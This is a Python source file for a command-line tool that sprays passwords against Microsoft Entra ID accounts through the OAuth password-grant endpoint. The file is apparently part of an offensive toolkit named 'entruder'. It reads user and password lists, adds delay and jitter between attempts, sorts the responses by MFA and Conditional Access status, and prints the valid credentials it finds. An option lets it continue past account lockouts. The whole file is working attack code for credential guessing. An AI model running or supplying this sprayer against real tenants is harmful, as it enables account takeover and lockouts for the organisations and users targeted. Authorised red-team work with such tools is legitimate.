import random
import time
from pathlib import Path

import typer

from entruder.static import MFA_SWEEP_RESOURCES
from entruder.utils import (
    handle_cli_errors,
    request_json,
    vprint,
    require_tenant,
)

from ._shared import brute_app, console, classify_ropc_result


def _read_lines(path_str: str) -> list:
    path = Path(path_str)
    if not path.exists():
        raise FileNotFoundError(path_str)
    return [line.strip() for line in path.read_text().splitlines() if line.strip()]


@brute_app.command("pwspray")
@handle_cli_errors
def brute_pwspray(
    tenant:      str = typer.Option(None, "-t", "--tenant", help="Tenant ID"),
    userlist:    str = typer.Option(..., "-u", "--upn", help="File of userPrincipalNames, one per line"),
    password:    str = typer.Option(None, "-p", "--password", help="A single password to spray (use this or --passwords)"),
    passwords:   str = typer.Option(None, "-P", "--passwords", help="File of passwords, one per line, each sprayed as its own round"),
    client_id:   str = typer.Option(..., "-c", "--client-id", help="Client ID to authenticate with"),
    resource:    str = typer.Option("graph", "-r", "--resource", help="Target resource for the spray (Optional, default: graph)"),
    domain:      str = typer.Option(None, "-d", "--domain", help="Append this domain to any bare (no @) entries in the list (Optional)"),
    user_agent:  str = typer.Option(None, "-a", "--user-agent", help="Use a single custom User-Agent (Optional)"),
    delay:       float = typer.Option(0.0, "--delay", help="Seconds to wait between attempts (Optional, default: 0)"),
    jitter:      float = typer.Option(0.0, "--jitter", help="Max random seconds added to each delay (Optional, default: 0)"),
    round_delay: float = typer.Option(0.0, "--round-delay", help="Seconds to wait between password rounds, the main lockout guard (Optional, default: 0)"),
    unsafe:      bool = typer.Option(False, "-n", "--unsafe", help="Continue past an account-locked response instead of stopping immediately (Optional, risks worsening the lockout)"),
):
    """
    Spray password(s) against a list of userPrincipalNames
    """
    tenant = require_tenant(tenant, console)
    resource_url = MFA_SWEEP_RESOURCES.get(resource, resource)

    if bool(password) == bool(passwords):
        console.print("[bold red][-][/] Provide exactly one of --password or --passwords")
        raise typer.Exit(1)

    try:
        candidates = _read_lines(userlist)
        spray_passwords = [password] if password else _read_lines(passwords)
    except FileNotFoundError as e:
        console.print(f"[bold red][-][/] File not found: {e}")
        raise typer.Exit(1)

    if domain:
        candidates = [c if "@" in c else f"{c}@{domain}" for c in candidates]
    candidates = list(dict.fromkeys(candidates))

    if not candidates:
        console.print("[bold red][-][/] Userlist is empty")
        raise typer.Exit(1)
    if not spray_passwords:
        console.print("[bold red][-][/] Password list is empty")
        raise typer.Exit(1)

    console.print(f"[bold]Spraying {len(spray_passwords)} password(s) against {len(candidates)} user(s)[/]\n")

    headers = {"User-Agent": user_agent} if user_agent else None
    solved = {}   # upn -> (password, reason) for every user whose password we confirm
    started = False

    for round_idx, pw in enumerate(spray_passwords):
        targets = [u for u in candidates if u not in solved]
        if not targets:
            break

        if len(spray_passwords) > 1:
            if round_idx > 0 and round_delay:
                console.print(f"[dim]Waiting {round_delay:.0f}s before the next password round[/dim]")
                time.sleep(round_delay)
            console.print(f"[bold]Round {round_idx + 1}/{len(spray_passwords)} ({len(targets)} user(s))[/]")

        for upn in targets:
            if started and (delay or jitter):
                time.sleep(delay + random.uniform(0, jitter))
            started = True

            vprint(f"Trying {upn}")
            result = request_json(
                "POST",
                f"https://login.microsoftonline.com/{tenant}/oauth2/token",
                data={
                    "grant_type": "password",
                    "client_id":  client_id,
                    "username":   upn,
                    "password":   pw,
                    "resource":   resource_url,
                },
                headers=headers,
            )

            status, message = classify_ropc_result(result)

            if status == "gap_no_mfa":
                solved[upn] = (pw, "valid, no MFA challenge")
                console.print(f"[bold green][+][/] VALID: {upn}. Authenticated with no MFA challenge")
                continue

            if status == "gap_unenrolled":
                solved[upn] = (pw, "valid, MFA required but not enrolled")
                console.print(f"[bold green][+][/] VALID: {upn}. Password correct, MFA required but not enrolled")
                continue

            if status == "expected_mfa":
                solved[upn] = (pw, "valid, MFA enforced")
                console.print(f"[bold green][+][/] VALID: {upn}. Password correct, MFA enforced")
                continue

            if status == "expected_ca":
                solved[upn] = (pw, "valid, blocked by Conditional Access")
                console.print(f"[bold green][+][/] VALID: {upn}. Password correct, blocked by Conditional Access")
                continue

            if status == "fatal_wrong_password":
                console.print(f"[dim][-] {upn}: wrong password[/dim]")
                continue

            if status == "fatal_account_missing":
                console.print(f"[dim][-] {upn}: account does not exist[/dim]")
                continue

            if status == "locked":
                console.print(f"[bold red][-][/] {upn}: {message}")
                if not unsafe:
                    console.print("[dim]Stopping to avoid worsening the lockout. Pass --unsafe to continue anyway.[/dim]")
                    raise typer.Exit(1)
                console.print("[dim]--unsafe set, continuing despite lockout[/dim]")
                continue

            # anything else: log and keep going rather than assuming it's fatal
            console.print(f"[dim][-] {upn}: {message}[/dim]")

    console.print()
    if solved:
        console.print(f"[bold green]{len(solved)} valid credential(s) found:[/]")
        multi = len(spray_passwords) > 1
        for upn, (pw, reason) in solved.items():
            line = f"  - {upn} : {pw} ({reason})" if multi else f"  - {upn} ({reason})"
            console.print(line)
    else:
        console.print(f"[bold]No valid credentials found across {len(candidates)} user(s)[/]")
